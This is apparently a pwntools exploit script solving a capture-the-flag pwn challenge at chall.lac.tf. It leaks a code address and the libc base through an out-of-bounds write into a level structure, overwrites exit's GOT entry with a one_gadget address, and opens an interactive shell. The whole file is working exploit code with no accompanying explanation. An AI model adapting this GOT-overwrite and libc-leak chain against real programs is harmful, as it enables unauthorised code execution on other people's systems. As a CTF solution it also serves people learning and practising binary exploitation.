from pwn import *

context.log_level = 'debug'

p = remote('chall.lac.tf', 31338)
e = ELF('./chall')
# p = e.process()

def create_level(index):
    p.sendlineafter(b'Choice: ', str(1))
    p.sendlineafter(b'index: ', str(index))
    
def edit_level(data):
    p.sendlineafter(b'Choice: ', str(2))
    p.sendlineafter(b'data: ', data)
    
def test_level():
    p.sendlineafter(b'Choice: ', str(3))

def explore(index):
    p.sendlineafter(b'Choice: ', str(4))
    p.sendlineafter(b'index: ', str(index))

def reset():
    p.sendlineafter(b'Choice: ', str(5))

p.recvuntil(b': ')
main_address = int(p.recvline()[:-1], 16)
code_base = main_address - 0x1662
puts_got = code_base + 0x4008

print(hex(code_base))
print(hex(puts_got))
print(hex(code_base + e.got['puts']))

# Round 1
# Set Level to Overwrite next index
create_level(1) # start: 1
create_level(2) # start: 1 2
create_level(3) # start: 1 2 3
explore(1) # start-1

# Overwrite start-2's next[0]
payload = b'A' * 0x30 + p64(puts_got-0x40)
edit_level(payload)

# Leak libc base
reset()
explore(2) # start-2
explore(0) # start-2-0
test_level() # leak puts_got ?
p.recvuntil(b'data: ')
libc_puts = p.recvn(8)
libc_base = u64(libc_puts) - 0x77980

# 0x4c139 0x4c140 0xd511f
one_gadget = libc_base + 0xd511f

# Round 2
reset()
explore(1)

# Overwrite start-2's next[0] 
exit_got = code_base + 0x4040
payload = b'A' * 0x30 + p64(exit_got-0x40)
edit_level(payload)

# Overwrite exit_got with one_gadget
reset()
explore(2)
explore(0)
edit_level(p64(one_gadget))

# Exit to Get Shell
p.sendlineafter(b'Choice: ', str(6))

p.interactive()
